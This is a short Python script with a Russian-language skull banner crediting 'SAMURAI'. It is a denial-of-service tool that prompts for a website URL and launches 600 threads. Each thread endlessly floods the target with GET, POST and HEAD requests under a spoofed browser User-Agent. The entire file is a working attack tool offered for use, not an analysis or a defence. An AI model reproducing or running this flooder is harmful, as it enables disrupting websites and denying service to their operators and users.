import requests 
from threading import Thread
import random
from colorama import Fore, Back, Style
from colorama import init

print(Fore.RED)
print('''
                  ...
                 ;::::;   
               ;::::; :;    
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;           OOO
           ::::::;       ;          OOOOO
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#

 	                     Версия: 0.2
 	                  Создатель: SAMURAI
 	                        DOS''')

users = [
	"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4"
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1"
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"]
headers = {
	'User-Agent' : random.choice(users)
}
print(Fore.YELLOW)
url = input("URL сайта: ")

def send():
	while True:
		requests.get(url, headers=headers)
		print('DOS...')
		requests.post(url, headers=headers)
		print("DOS...")
		requests.head(url, headers=headers)
		print("DOS...")

if __name__ == '__main__':
	for i in range (600):
		thr = Thread(target=send)
		thr.start()
